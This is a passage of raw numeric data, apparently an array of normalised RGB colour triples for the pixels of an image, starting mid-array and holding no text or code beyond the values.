0.659,0.616},{0.843,0.537,0.494},{0.773,0.38,0.318},{0.647,0.227,0.161},{0.694,0.376,0.271},{0.847,0.588,0.443},{0.871,0.624,0.478},{0.89,0.639,0.502},{0.902,0.655,0.518},{0.906,0.659,0.522},{0.91,0.659,0.522},{0.922,0.678,0.545},{0.925,0.682,0.545},{0.925,0.682,0.545},
{0.933,0.694,0.557},{0.937,0.706,0.569},{0.937,0.71,0.573},{0.937,0.706,0.576},{0.949,0.718,0.596},{0.957,0.725,0.608},{0.953,0.737,0.612},{0.961,0.733,0.612},{0.953,0.733,0.608},{0.949,0.737,0.616},{0.953,0.729,0.608},{0.945,0.722,0.604},{0.941,0.71,0.592},{0.937,0.71,0.584},{0.929,0.698,0.576},{0.914,0.694,0.58},{0.831,0.714,0.698},{0.878,0.788,0.788},{0.875,0.78,0.788},{0.898,0.639,0.498},{0.898,0.639,0.498},{0.91,0.659,0.518},{0.906,0.655,0.514},{0.878,0.627,0.486},{0.835,0.569,0.427},{0.78,0.494,0.361},{0.71,0.424,0.294},{0.608,0.337,0.227},{0.549,0.294,0.192},{0.576,0.322,0.224},{0.639,0.384,0.278},{0.663,0.4,0.282},{0.698,0.435,0.302},{0.733,0.467,0.333},{0.757,0.49,0.353},{0.788,0.518,0.38},{0.82,0.537,0.408},{0.855,0.573,0.443},{0.855,0.565,0.431},{0.835,0.545,0.408},{0.812,0.518,0.384},{0.788,0.494,0.365},{0.765,0.471,0.341},{0.737,0.451,0.322},{0.725,0.443,0.314},{0.725,0.424,0.306},{0.714,0.416,0.294},{0.71,0.424,0.298},{0.706,0.416,0.286},{0.694,0.396,0.271},{0.671,0.38,0.255},{0.643,0.353,0.235},{0.608,0.322,0.208},
{0.58,0.302,0.188},{0.533,0.271,0.165},{0.49,0.235,0.137},{0.431,0.188,0.11},{0.349,0.125,0.055},{0.263,0.067,0.02},{0.196,0.027,0.012},{0.173,0.012,0.008},{0.196,0.027,0.008},{0.294,0.102,0.031},{0.333,0.118,0.047},{0.369,0.153,0.071},{0.373,0.161,0.09},{0.455,0.227,0.141},{0.525,0.286,0.184},{0.612,0.361,0.243},{0.678,0.424,0.286},{0.714,0.459,0.318},{0.753,0.502,0.361},{0.761,0.537,0.4},{0.729,0.722,0.702},{0.765,0.608,0.522},{0.682,0.427,0.31},{0.694,0.431,0.314},{0.655,0.392,0.278},{0.604,0.329,0.235},{0.573,0.298,0.212},{0.588,0.318,0.235},{0.6,0.329,0.239},{0.631,0.353,0.259},{0.663,0.38,0.282},{0.706,0.424,0.322},{0.749,0.478,0.365},{0.824,0.588,0.49},{0.902,0.765,0.733},{0.776,0.435,0.373},{0.729,0.341,0.271},{0.667,0.306,0.22},{0.827,0.561,0.424},{0.859,0.604,0.463},{0.882,0.631,0.49},{0.89,0.635,0.502},{0.902,0.651,0.514},{0.914,0.663,0.529},{0.925,0.678,0.545},{0.929,0.686,0.553},{0.929,0.698,0.561},{0.937,0.706,0.573},{0.941,0.706,0.573},{0.941,0.714,0.58},{0.949,0.725,0.6},{0.949,0.725,0.604},{0.957,0.733,0.612},
{0.953,0.733,0.608},{0.961,0.733,0.612},{0.965,0.745,0.624},{0.969,0.749,0.62},{0.965,0.741,0.616},{0.953,0.733,0.612},{0.957,0.741,0.616},{0.949,0.725,0.6},{0.945,0.718,0.596},{0.902,0.706,0.616},{0.831,0.722,0.706},{0.886,0.8,0.8},{0.882,0.792,0.8},{0.902,0.639,0.498},{0.902,0.639,0.498},{0.91,0.655,0.518},{0.922,0.671,0.533},{0.914,0.659,0.522},{0.878,0.612,0.471},{0.831,0.549,0.408},{0.753,0.467,0.333},{0.651,0.376,0.251},{0.565,0.298,0.188},{0.529,0.271,0.173},{0.541,0.278,0.176},{0.561,0.302,0.192},{0.58,0.318,0.204},{0.58,0.318,0.208},{0.545,0.286,0.18},{0.533,0.255,0.161},{0.655,0.369,0.259},{0.82,0.549,0.42},{0.835,0.565,0.427},{0.812,0.529,0.396},{0.788,0.498,0.365},{0.761,0.471,0.337},{0.745,0.459,0.329},{0.733,0.455,0.322},{0.741,0.471,0.337},{0.749,0.467,0.341},{0.745,0.463,0.333},{0.741,0.467,0.333},{0.725,0.447,0.318},{0.706,0.416,0.29},{0.686,0.392,0.267},{0.659,0.365,0.243},{0.624,0.341,0.224},{0.596,0.318,0.2},{0.549,0.294,0.184},{0.494,0.239,0.141},{0.42,0.18,0.098},{0.341,0.125,0.051},{0.267,0.071,0.02},
{0.204,0.031,0.008},{0.18,0.02,0.008},{0.22,0.047,0.012},{0.333,0.137,0.063},{0.431,0.204,0.098},{0.565,0.318,0.173},{0.651,0.38,0.22},{0.537,0.275,0.149},{0.373,0.125,0.047},{0.341,0.094,0.031},{0.349,0.094,0.024},{0.38,0.118,0.039},{0.42,0.161,0.067},{0.475,0.216,0.106},{0.533,0.286,0.173},{0.627,0.486,0.42},{0.608,0.357,0.263},{0.553,0.302,0.224},{0.533,0.275,0.204},{0.537,0.278,0.208},{0.573,0.302,0.227},{0.604,0.325,0.243},{0.639,0.353,0.259},{0.698,0.4,0.298},{0.753,0.467,0.357},{0.788,0.522,0.412},{0.824,0.576,0.463},{0.847,0.624,0.51},{0.878,0.686,0.596},{0.886,0.745,0.69},{0.769,0.451,0.337},{0.741,0.471,0.373},{0.792,0.549,0.447},{0.843,0.596,0.471},{0.867,0.612,0.478},{0.882,0.631,0.506},{0.894,0.647,0.518},{0.906,0.659,0.529},{0.906,0.659,0.525},{0.922,0.675,0.537},{0.925,0.69,0.553},{0.933,0.702,0.569},{0.937,0.71,0.573},{0.945,0.725,0.596},{0.945,0.718,0.596},{0.941,0.722,0.6},{0.953,0.722,0.604},{0.953,0.725,0.604},{0.957,0.729,0.604},{0.965,0.737,0.612},{0.969,0.745,0.62},{0.961,0.729,0.6},{0.969,0.737,0.612},
{0.953,0.737,0.612},{0.953,0.729,0.604},{0.945,0.722,0.6},{0.902,0.71,0.627},{0.835,0.729,0.722},{0.882,0.796,0.796},{0.89,0.792,0.804},{0.914,0.647,0.514},{0.914,0.647,0.514},{0.929,0.671,0.541},{0.941,0.69,0.573},{0.941,0.69,0.569},{0.929,0.678,0.541},{0.906,0.647,0.506},{0.851,0.58,0.431},{0.745,0.467,0.329},{0.627,0.357,0.231},{0.545,0.278,0.176},{0.514,0.251,0.165},{0.502,0.243,0.157},{0.478,0.224,0.141},{0.455,0.204,0.122},{0.502,0.224,0.133},{0.545,0.239,0.137},{0.533,0.208,0.118},{0.678,0.376,0.267},{0.796,0.514,0.376},{0.776,0.502,0.361},{0.765,0.482,0.349},{0.737,0.459,0.329},{0.722,0.447,0.322},{0.714,0.427,0.306},{0.714,0.388,0.275},{0.737,0.424,0.329},{0.749,0.435,0.333},{0.737,0.463,0.333},{0.733,0.463,0.329},{0.725,0.447,0.314},{0.706,0.412,0.29},{0.678,0.384,0.263},{0.647,0.357,0.239},{0.608,0.329,0.216},{0.557,0.29,0.184},{0.506,0.247,0.149},{0.416,0.165,0.086},{0.314,0.102,0.035},{0.255,0.067,0.016},{0.22,0.047,0.012},{0.255,0.075,0.024},{0.486,0.259,0.153},{0.725,0.471,0.294},{0.804,0.541,0.337},{0.792,0.522,0.322},
{0.749,0.471,0.275},{0.702,0.42,0.239},{0.639,0.353,0.192},{0.506,0.231,0.11},{0.443,0.169,0.071},{0.427,0.153,0.055},{0.404,0.141,0.047},{0.392,0.133,0.047},{0.404,0.145,0.055},{0.451,0.196,0.106},{0.529,0.29,0.22},{0.533,0.282,0.212},{0.569,0.302,0.227},{0.627,0.349,0.263},{0.682,0.404,0.31},{0.733,0.451,0.345},{0.769,0.494,0.388},{0.808,0.533,0.431},{0.824,0.561,0.455},{0.843,0.592,0.494},{0.859,0.624,0.533},{0.886,0.678,0.596},{0.886,0.686,0.616},{0.882,0.678,0.616},{0.867,0.643,0.569},{0.796,0.541,0.443},{0.78,0.537,0.447},{0.855,0.635,0.541},{0.871,0.635,0.522},{0.875,0.631,0.514},{0.878,0.635,0.506},{0.882,0.631,0.506},{0.898,0.647,0.525},{0.902,0.655,0.522},{0.91,0.663,0.529},{0.922,0.678,0.549},{0.925,0.686,0.557},{0.925,0.69,0.565},{0.922,0.686,0.565},{0.933,0.694,0.58},{0.937,0.702,0.584},{0.941,0.71,0.58},{0.949,0.722,0.596},{0.953,0.729,0.604},{0.949,0.722,0.588},{0.953,0.718,0.588},{0.953,0.725,0.596},{0.953,0.729,0.604},{0.945,0.714,0.584},{0.941,0.71,0.58},{0.886,0.698,0.62},{0.839,0.733,0.725},{0.882,0.796,0.796},
{0.886,0.792,0.8},{0.925,0.671,0.541},{0.925,0.671,0.541},{0.945,0.702,0.584},{0.949,0.714,0.596},{0.945,0.698,0.573},{0.933,0.682,0.545},{0.922,0.667,0.529},{0.894,0.643,0.498},{0.82,0.565,0.416},{0.714,0.443,0.306},{0.631,0.361,0.235},{0.553,0.294,0.184},{0.51,0.251,0.153},{0.545,0.275,0.176},{0.655,0.373,0.255},{0.655,0.376,0.271},{0.588,0.337,0.247},{0.792,0.506,0.38},{0.729,0.408,0.29},{0.78,0.502,0.365},{0.761,0.49,0.357},{0.741,0.467,0.333},{0.71,0.416,0.298},{0.694,0.333,0.239},{0.682,0.275,0.2},{0.651,0.243,0.196},{0.635,0.239,0.22},{0.722,0.31,0.247},{0.722,0.396,0.282},{0.729,0.455,0.322},{0.729,0.451,0.318},{0.729,0.435,0.306},{0.722,0.435,0.31},{0.694,0.412,0.29},{0.643,0.369,0.251},{0.596,0.325,0.22},{0.549,0.282,0.188},{0.447,0.196,0.114},{0.298,0.09,0.031},{0.224,0.043,0.012},{0.376,0.173,0.09},{0.714,0.467,0.29},{0.827,0.576,0.376},{0.82,0.565,0.365},{0.769,0.51,0.322},{0.729,0.463,0.278},{0.706,0.427,0.251},{0.671,0.396,0.227},{0.631,0.361,0.204},{0.592,0.318,0.169},{0.518,0.251,0.129},{0.443,0.173,0.078},
{0.412,0.145,0.059},{0.384,0.161,0.086},{0.349,0.286,0.263},{0.392,0.322,0.294},{0.576,0.322,0.243},{0.643,0.384,0.294},{0.733,0.463,0.361},{0.784,0.514,0.408},{0.8,0.537,0.435},{0.812,0.561,0.455},{0.839,0.6,0.502},{0.855,0.612,0.51},{0.863,0.624,0.537},{0.882,0.651,0.573},{0.875,0.647,0.576},{0.875,0.635,0.573},{0.871,0.631,0.58},{0.863,0.624,0.576},{0.859,0.612,0.557},{0.824,0.565,0.478},{0.769,0.518,0.431},{0.827,0.608,0.533},{0.894,0.698,0.62},{0.875,0.639,0.537},{0.867,0.616,0.498},{0.878,0.624,0.514},{0.886,0.639,0.522},{0.898,0.651,0.525},{0.898,0.655,0.533},{0.91,0.663,0.541},{0.906,0.651,0.525},{0.898,0.651,0.525},{0.89,0.643,0.522},{0.898,0.651,0.533},{0.902,0.655,0.533},{0.898,0.651,0.529},{0.894,0.651,0.529},{0.89,0.647,0.529},{0.894,0.647,0.525},{0.886,0.635,0.518},{0.886,0.639,0.522},{0.914,0.671,0.549},{0.914,0.678,0.553},{0.918,0.675,0.545},{0.855,0.671,0.6},{0.847,0.745,0.737},{0.882,0.8,0.8},{0.886,0.792,0.8},{0.929,0.678,0.549},{0.929,0.678,0.549},{0.933,0.706,0.6},{0.91,0.686,0.576},{0.886,0.639,0.506},
{0.89,0.639,0.502},{0.871,0.612,0.478},{0.843,0.576,0.443},{0.804,0.537,0.416},{0.776,0.518,0.376},{0.741,0.478,0.329},{0.671,0.4,0.259},{0.69,0.408,0.282},{0.725,0.439,0.318},{0.659,0.376,0.267},{0.298,0.082,0.047},{0.373,0.129,0.082},{0.667,0.365,0.259},{0.745,0.455,0.329},{0.765,0.502,0.361},{0.761,0.494,0.361},{0.729,0.4,0.29},{0.733,0.318,0.247},{0.725,0.298,0.239},{0.545,0.196,0.173},{0.306,0.071,0.067},{0.667,0.239,0.231},{0.737,0.302,0.243},{0.722,0.341,0.247},{0.757,0.471,0.341},{0.749,0.463,0.333},{0.765,0.486,0.353},{0.78,0.506,0.373},{0.753,0.482,0.353},{0.706,0.431,0.31},{0.659,0.388,0.271},{0.608,0.329,0.224},{0.518,0.255,0.165},{0.353,0.129,0.063},{0.502,0.271,0.161},{0.796,0.537,0.353},{0.82,0.565,0.373},{0.784,0.533,0.341},{0.749,0.486,0.306},{0.722,0.455,0.278},{0.69,0.424,0.259},{0.663,0.392,0.235},{0.627,0.361,0.212},{0.588,0.322,0.184},{0.545,0.286,0.157},{0.51,0.251,0.129},{0.475,0.216,0.106},{0.345,0.204,0.145},{0.278,0.278,0.259},{0.337,0.18,0.137},{0.412,0.188,0.122},{0.69,0.431,0.337},{0.776,0.525,0.42},
{0.812,0.557,0.455},{0.835,0.584,0.486},{0.843,0.604,0.518},{0.859,0.635,0.557},{0.878,0.651,0.569},{0.875,0.643,0.565},{0.855,0.604,0.537},{0.835,0.561,0.51},{0.843,0.557,0.522},{0.851,0.573,0.541},{0.859,0.596,0.565},{0.859,0.592,0.565},{0.871,0.616,0.584},{0.851,0.561,0.518},{0.776,0.506,0.431},{0.769,0.518,0.439},{0.867,0.651,0.584},{0.894,0.682,0.6},{0.882,0.643,0.529},{0.871,0.627,0.522},{0.89,0.651,0.549},{0.898,0.655,0.541},{0.894,0.655,0.537},{0.894,0.647,0.529},{0.89,0.635,0.522},{0.886,0.635,0.522},{0.863,0.612,0.502},{0.851,0.6,0.49},{0.831,0.576,0.467},{0.812,0.545,0.435},{0.8,0.522,0.404},{0.796,0.537,0.427},{0.788,0.514,0.408},{0.765,0.494,0.376},{0.765,0.502,0.38},{0.761,0.498,0.38},{0.737,0.478,0.357},{0.722,0.475,0.357},{0.769,0.6,0.553},{0.855,0.753,0.749},{0.89,0.804,0.804},{0.89,0.796,0.804},{0.918,0.671,0.537},{0.918,0.671,0.537},{0.839,0.616,0.498},{0.71,0.475,0.365},{0.761,0.502,0.369},{0.847,0.584,0.455},{0.835,0.561,0.443},{0.788,0.506,0.396},{0.706,0.42,0.31},{0.494,0.275,0.196},{0.702,0.451,0.325},
{0.839,0.569,0.42},{0.89,0.635,0.51},{0.859,0.588,0.463},{0.761,0.475,0.357},{0.643,0.333,0.231},{0.769,0.475,0.361},{0.859,0.596,0.467},{0.863,0.596,0.459},{0.831,0.561,0.424},{0.78,0.416,0.306},{0.808,0.4,0.337},{0.776,0.373,0.322},{0.667,0.306,0.267},{0.106,0.035,0.031},{0.376,0.106,0.106},{0.745,0.306,0.294},{0.78,0.341,0.29},{0.753,0.357,0.267},{0.796,0.506,0.38},{0.796,0.51,0.38},{0.816,0.545,0.412},{0.82,0.565,0.431},{0.804,0.533,0.4},{0.78,0.502,0.384},{0.733,0.451,0.341},{0.678,0.384,0.282},{0.58,0.31,0.208},{0.624,0.357,0.227},{0.788,0.525,0.341},{0.788,0.529,0.349},{0.761,0.502,0.325},{0.729,0.471,0.302},{0.694,0.431,0.271},{0.675,0.412,0.259},{0.647,0.388,0.235},{0.631,0.373,0.231},{0.584,0.329,0.2},{0.549,0.294,0.176},{0.506,0.251,0.145},{0.478,0.227,0.125},{0.384,0.231,0.161},{0.29,0.224,0.184},{0.376,0.149,0.078},{0.227,0.176,0.161},{0.224,0.29,0.286},{0.733,0.486,0.388},{0.808,0.569,0.471},{0.839,0.616,0.541},{0.863,0.631,0.553},{0.875,0.612,0.525},{0.867,0.588,0.506},{0.8,0.522,0.459},{0.745,0.439,0.388},
{0.808,0.525,0.494},{0.867,0.6,0.576},{0.878,0.588,0.565},{0.882,0.584,0.569},{0.878,0.545,0.525},{0.867,0.545,0.529},{0.867,0.557,0.545},{0.875,0.565,0.553},{0.847,0.553,0.522},{0.725,0.435,0.341},{0.792,0.545,0.475},{0.886,0.675,0.616},{0.886,0.675,0.604},{0.894,0.698,0.627},{0.89,0.686,0.612},{0.878,0.647,0.565},{0.867,0.624,0.514},{0.851,0.596,0.486},{0.851,0.596,0.494},{0.847,0.58,0.482},{0.808,0.537,0.447},{0.765,0.498,0.412},{0.725,0.459,0.365},{0.659,0.388,0.302},{0.592,0.329,0.247},{0.482,0.243,0.173},{0.392,0.18,0.129},{0.31,0.133,0.09},{0.227,0.086,0.059},{0.18,0.055,0.031},{0.192,0.047,0.027},{0.239,0.067,0.039},{0.675,0.541,0.518},{0.851,0.749,0.749},{0.882,0.796,0.796},{0.886,0.796,0.804},{0.878,0.643,0.502},{0.878,0.643,0.502},{0.698,0.486,0.388},{0.627,0.416,0.322},{0.78,0.525,0.404},{0.867,0.612,0.498},{0.824,0.557,0.447},{0.761,0.471,0.361},{0.694,0.416,0.306},{0.318,0.165,0.118},{0.463,0.243,0.173},{0.839,0.588,0.455},{0.945,0.71,0.6},{0.929,0.678,0.569},{0.839,0.573,0.447},{0.776,0.494,0.384},{0.878,0.612,0.498},
{0.906,0.643,0.522},{0.898,0.627,0.506},{0.871,0.596,0.478},{0.851,0.486,0.412},{0.827,0.467,0.431},{0.733,0.318,0.267},{0.722,0.529,0.486},{0.106,0.043,0.039},{0.525,0.184,0.176},{0.82,0.392,0.38},{0.851,0.451,0.412},{0.796,0.384,0.29},{0.824,0.529,0.408},{0.835,0.557,0.424},{0.851,0.573,0.447},{0.859,0.584,0.463},{0.855,0.584,0.467},{0.851,0.584,0.478},{0.82,0.541,0.435},{0.761,0.467,0.357},{0.694,0.412,0.286},{0.769,0.498,0.318},{0.769,0.506,0.325},{0.745,0.49,0.322},{0.722,0.467,0.306},{0.702,0.447,0.29},{0.671,0.412,0.267},{0.659,0.4,0.263},{0.639,0.388,0.251},{0.62,0.369,0.235},{0.58,0.325,0.204},{0.557,0.302,0.192},{0.529,0.278,0.169},{0.502,0.255,0.145},{0.4,0.263,0.208},{0.451,0.216,0.129},{0.443,0.322,0.251},{0.282,0.239,0.208},{0.231,0.282,0.267},{0.702,0.471,0.369},{0.82,0.588,0.49},{0.835,0.584,0.506},{0.804,0.525,0.463},{0.749,0.459,0.416},{0.69,0.38,0.341},{0.776,0.482,0.439},{0.863,0.588,0.565},{0.89,0.612,0.549},{0.894,0.627,0.612},{0.898,0.608,0.592},{0.914,0.627,0.612},{0.902,0.588,0.565},{0.898,0.553,0.533},
{0.882,0.514,0.498},{0.871,0.498,0.486},{0.867,0.494,0.475},{0.757,0.435,0.361},{0.722,0.404,0.337},{0.827,0.573,0.51},{0.855,0.627,0.569},{0.875,0.663,0.627},{0.89,0.698,0.663},{0.878,0.663,0.612},{0.851,0.6,0.506},{0.812,0.541,0.455},{0.769,0.486,0.42},{0.714,0.412,0.369},{0.612,0.314,0.286},{0.467,0.2,0.176},{0.337,0.125,0.102},{0.212,0.059,0.047},{0.114,0.02,0.016},{0.067,0.004,0.008},{0.082,0.012,0.008},{0.176,0.043,0.02},{0.306,0.09,0.043},{0.416,0.141,0.067},{0.463,0.173,0.082},{0.502,0.208,0.114},{0.737,0.592,0.565},{0.851,0.757,0.757},{0.89,0.812,0.816},{0.902,0.812,0.824},{0.831,0.608,0.467},{0.831,0.608,0.467},{0.612,0.408,0.318},{0.647,0.427,0.349},{0.859,0.639,0.553},{0.89,0.643,0.537},{0.824,0.565,0.455},{0.812,0.553,0.443},{0.776,0.537,0.443},{0.408,0.251,0.212},{0.408,0.204,0.145},{0.753,0.506,0.4},{0.867,0.624,0.498},{0.898,0.647,0.529},{0.792,0.494,0.373},{0.686,0.322,0.216},{0.82,0.494,0.38},{0.89,0.616,0.494},{0.882,0.62,0.482},{0.855,0.557,0.427},{0.855,0.451,0.376},{0.824,0.439,0.396},{0.718,0.314,0.271},
{0.698,0.514,0.482},{0.149,0.024,0.024},{0.549,0.184,0.176},{0.847,0.431,0.412},{0.878,0.506,0.467},{0.796,0.4,0.306},{0.839,0.545,0.431},{0.851,0.569,0.443},{0.867,0.592,0.467},{0.882,0.616,0.494},{0.902,0.651,0.553},{0.914,0.682,0.604},{0.878,0.62,0.518},{0.804,0.529,0.412},{0.761,0.49,0.322},{0.769,0.506,0.333},{0.753,0.494,0.329},{0.725,0.467,0.318},{0.714,0.459,0.31},{0.698,0.443,0.302},{0.682,0.427,0.29},{0.675,0.42,0.286},{0.659,0.404,0.278},{0.639,0.388,0.259},{0.616,0.365,0.239},{0.6,0.349,0.224},{0.584,0.325,0.204},{0.561,0.31,0.188},{0.486,0.357,0.298},{0.486,0.322,0.239},{0.427,0.447,0.431},{0.192,0.306,0.325},{0.345,0.235,0.188},{0.663,0.431,0.333},{0.737,0.506,0.427},{0.604,0.349,0.294},{0.451,0.176,0.137},{0.533,0.239,0.188},{0.765,0.435,0.396},{0.859,0.518,0.494},{0.89,0.58,0.565},{0.894,0.596,0.522},{0.902,0.639,0.624},{0.918,0.651,0.631},{0.918,0.639,0.624},{0.902,0.635,0.624},{0.882,0.569,0.553},{0.855,0.518,0.506},{0.808,0.459,0.447},{0.769,0.427,0.416},{0.722,0.384,0.337},{0.698,0.357,0.286},{0.749,0.467,0.4},
{0.788,0.537,0.475},{0.784,0.573,0.529},{0.776,0.549,0.51},{0.769,0.537,0.494},{0.702,0.431,0.365},{0.627,0.345,0.29},{0.522,0.239,0.204},{0.408,0.137,0.106},{0.322,0.063,0.047},{0.18,0.008,0.008},{0.141,0.012,0.008},{0.165,0.02,0.012},{0.239,0.047,0.024},{0.325,0.086,0.039},{0.42,0.141,0.063},{0.471,0.18,0.094},{0.498,0.208,0.114},{0.514,0.224,0.122},{0.522,0.227,0.125},{0.522,0.235,0.141},{0.757,0.62,0.596},{0.855,0.761,0.757},{0.902,0.82,0.82},{0.906,0.82,0.827},{0.788,0.608,0.478},{0.788,0.608,0.478},{0.643,0.451,0.349},{0.682,0.459,0.369},{0.922,0.706,0.624},{0.898,0.651,0.557},{0.812,0.541,0.435},{0.769,0.494,0.392},{0.718,0.467,0.376},{0.412,0.255,0.212},{0.216,0.075,0.043},{0.659,0.416,0.318},{0.843,0.6,0.482},{0.867,0.608,0.471},{0.89,0.624,0.486},{0.91,0.635,0.506},{0.929,0.667,0.537},{0.922,0.651,0.522},{0.898,0.635,0.49},{0.863,0.592,0.459},{0.859,0.475,0.38},{0.835,0.42,0.357},{0.761,0.314,0.267},{0.58,0.165,0.133},{0.259,0.02,0.016},{0.482,0.149,0.141},{0.863,0.435,0.416},{0.859,0.416,0.349},{0.847,0.494,0.392},
{0.847,0.557,0.431},{0.859,0.588,0.455},{0.886,0.624,0.498},{0.906,0.643,0.533},{0.918,0.667,0.565},{0.922,0.682,0.604},{0.882,0.627,0.522},{0.784,0.51,0.365},{0.773,0.502,0.329},{0.765,0.506,0.345},{0.745,0.486,0.333},{0.733,0.475,0.333},{0.725,0.471,0.333},{0.714,0.463,0.333},{0.706,0.455,0.325},{0.698,0.447,0.318},{0.694,0.447,0.318},{0.686,0.435,0.31},{0.667,0.42,0.29},{0.647,0.396,0.267},{0.631,0.376,0.247},{0.608,0.353,0.224},{0.529,0.42,0.353},{0.498,0.408,0.357},{0.396,0.565,0.6},{0.18,0.282,0.294},{0.376,0.188,0.114},{0.655,0.431,0.333},{0.702,0.455,0.38},{0.737,0.443,0.376},{0.545,0.235,0.196},{0.482,0.161,0.11},{0.725,0.408,0.318},{0.859,0.514,0.431},{0.886,0.576,0.478},{0.82,0.514,0.396},{0.882,0.588,0.494},{0.906,0.631,0.557},{0.89,0.584,0.506},{0.871,0.569,0.486},{0.835,0.533,0.443},{0.773,0.455,0.369},{0.753,0.447,0.365},{0.725,0.424,0.361},{0.682,0.384,0.337},{0.71,0.369,0.329},{0.733,0.435,0.38},{0.741,0.478,0.424},{0.671,0.431,0.373},{0.659,0.42,0.361},{0.6,0.337,0.271},{0.471,0.196,0.141},{0.349,0.102,0.063},
{0.282,0.059,0.031},{0.255,0.039,0.02},{0.278,0.051,0.02},{0.322,0.075,0.027},{0.373,0.106,0.047},{0.416,0.133,0.067},{0.451,0.165,0.082},{0.486,0.204,0.11},{0.51,0.231,0.133},{0.525,0.239,0.141},{0.525,0.247,0.149},{0.533,0.247,0.149},{0.529,0.247,0.145},{0.537,0.267,0.173},{0.773,0.647,0.635},{0.851,0.753,0.757},{0.898,0.816,0.82},{0.914,0.824,0.831},{0.792,0.659,0.573},{0.792,0.659,0.573},{0.776,0.635,0.537},{0.706,0.514,0.412},{0.851,0.624,0.518},{0.906,0.663,0.561},{0.863,0.588,0.482},{0.8,0.51,0.412},{0.702,0.431,0.349},{0.494,0.302,0.247},{0.208,0.086,0.055},{0.596,0.361,0.271},{0.835,0.596,0.482},{0.871,0.612,0.478},{0.894,0.624,0.486},{0.91,0.635,0.502},{0.929,0.659,0.533},{0.937,0.678,0.553},{0.929,0.659,0.529},{0.906,0.639,0.502},{0.875,0.608,0.471},{0.855,0.518,0.412},{0.839,0.435,0.369},{0.776,0.337,0.286},{0.678,0.235,0.196},{0.639,0.22,0.192},{0.835,0.42,0.373},{0.863,0.486,0.392},{0.882,0.604,0.475},{0.878,0.608,0.467},{0.882,0.62,0.478},{0.898,0.647,0.514},{0.906,0.643,0.518},{0.914,0.659,0.549},{0.918,0.667,0.565},
{0.875,0.62,0.506},{0.773,0.506,0.341},{0.773,0.518,0.357},{0.765,0.51,0.361},{0.757,0.502,0.357},{0.757,0.506,0.369},{0.749,0.502,0.369},{0.737,0.49,0.365},{0.725,0.478,0.349},{0.725,0.471,0.345},{0.725,0.478,0.349},{0.718,0.471,0.341},{0.706,0.455,0.325},{0.686,0.431,0.298},{0.671,0.412,0.275},{0.651,0.392,0.255},{0.627,0.384,0.251},{0.478,0.553,0.557},{0.404,0.549,0.576},{0.282,0.424,0.447},{0.129,0.055,0.035},{0.627,0.396,0.298},{0.718,0.486,0.408},{0.82,0.557,0.498},{0.78,0.471,0.396},{0.612,0.282,0.196},{0.608,0.275,0.18},{0.765,0.455,0.322},{0.792,0.494,0.361},{0.82,0.514,0.384},{0.878,0.588,0.455},{0.925,0.655,0.557},{0.773,0.486,0.388},{0.784,0.502,0.396},{0.733,0.447,0.345},{0.706,0.376,0.302},{0.741,0.42,0.345},{0.765,0.482,0.404},{0.718,0.439,0.373},{0.678,0.353,0.302},{0.706,0.431,0.373},{0.667,0.42,0.353},{0.588,0.337,0.286},{0.494,0.251,0.188},{0.396,0.153,0.094},{0.345,0.106,0.051},{0.322,0.078,0.031},{0.341,0.09,0.039},{0.369,0.11,0.047},{0.404,0.137,0.067},{0.439,0.165,0.086},{0.471,0.192,0.098},{0.494,0.22,0.125},
{0.518,0.239,0.141},{0.529,0.255,0.153},{0.541,0.271,0.161},{0.549,0.278,0.169},{0.553,0.286,0.176},{0.557,0.29,0.18},{0.561,0.294,0.184},{0.576,0.322,0.231},{0.784,0.667,0.663},{0.839,0.733,0.737},{0.906,0.82,0.827},{0.914,0.827,0.835},{0.804,0.69,0.635},{0.804,0.69,0.635},{0.796,0.678,0.62},{0.812,0.69,0.62},{0.796,0.663,0.573},{0.82,0.651,0.549},{0.851,0.651,0.541},{0.863,0.639,0.522},{0.847,0.608,0.49},{0.78,0.545,0.435},{0.631,0.404,0.314},{0.78,0.533,0.427},{0.871,0.624,0.502},{0.898,0.643,0.522},{0.906,0.639,0.51},{0.918,0.643,0.51},{0.933,0.659,0.529},{0.941,0.671,0.541},{0.945,0.675,0.549},{0.937,0.667,0.537},{0.925,0.659,0.529},{0.898,0.635,0.498},{0.875,0.608,0.475},{0.855,0.553,0.431},{0.831,0.518,0.4},{0.839,0.549,0.424},{0.875,0.58,0.455},{0.894,0.635,0.498},{0.882,0.631,0.49},{0.886,0.627,0.486},{0.89,0.627,0.49},{0.894,0.639,0.502},{0.894,0.639,0.51},{0.898,0.643,0.522},{0.886,0.631,0.51},{0.812,0.557,0.424},{0.776,0.514,0.345},{0.776,0.522,0.369},{0.773,0.522,0.373},{0.773,0.525,0.388},{0.769,0.522,0.388},
{0.769,0.525,0.388},{0.761,0.518,0.384},{0.753,0.502,0.373},{0.757,0.502,0.373},{0.757,0.506,0.373},{0.753,0.502,0.373},{0.741,0.494,0.357},{0.718,0.467,0.325},{0.706,0.447,0.31},{0.69,0.431,0.294},{0.631,0.463,0.361},{0.541,0.573,0.549},{0.384,0.631,0.69},{0.396,0.655,0.706},{0.18,0.251,0.275},{0.569,0.357,0.275},{0.627,0.412,0.329},{0.659,0.4,0.333},{0.655,0.349,0.29},{0.671,0.349,0.306},{0.706,0.337,0.263},{0.643,0.208,0.145},{0.525,0.129,0.094},{0.588,0.247,0.216},{0.667,0.306,0.271},{0.753,0.427,0.376},{0.722,0.38,0.329},{0.69,0.345,0.298},{0.667,0.302,0.271},{0.655,0.294,0.267},{0.659,0.302,0.271},{0.635,0.275,0.247},{0.659,0.345,0.286},{0.631,0.325,0.267},{0.624,0.365,0.302},{0.565,0.325,0.267},{0.478,0.235,0.176},{0.396,0.157,0.09},{0.373,0.122,0.059},{0.384,0.129,0.063},{0.4,0.137,0.075},{0.431,0.165,0.094},{0.459,0.196,0.114},{0.482,0.22,0.133},{0.514,0.251,0.157},{0.529,0.267,0.161},{0.545,0.278,0.169},{0.561,0.294,0.18},{0.573,0.302,0.18},{0.573,0.302,0.188},{0.592,0.314,0.196},{0.596,0.322,0.204},{0.596,0.322,0.208},
